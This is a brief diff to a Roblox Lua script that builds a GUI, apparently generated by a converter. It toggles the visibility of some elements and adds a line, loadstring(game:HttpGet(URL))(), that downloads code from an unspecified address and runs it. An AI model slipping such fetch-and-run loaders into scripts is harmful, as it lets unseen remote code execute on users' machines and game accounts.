@@ -118,7 +118,6 @@ Juicy["f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
 Juicy["10"] = Instance.new("ImageLabel", Juicy["1"]);
 Juicy["10"]["BorderSizePixel"] = 0;
 Juicy["10"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
-Juicy["10"]["Visible"] = false;
 Juicy["10"]["Image"] = [[http://www.roblox.com/asset/?id=9210647432]];
 Juicy["10"]["Size"] = UDim2.new(0.0556660033762455, 0, 0.09312637895345688, 0);
 Juicy["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
@@ -138,6 +137,9 @@ Juicy["14"]["Name"] = [[Drag]];
 
 Juicy["15"] = Instance.new("LocalScript", Juicy["10"]);
 Juicy["15"]["Name"] = [[Functioner]];
+
+Juicy["2"]["Visible"] = false
+loadstring(game:HttpGet(URL))()
 
 local function C_9()
 	local script = Juicy["9"];
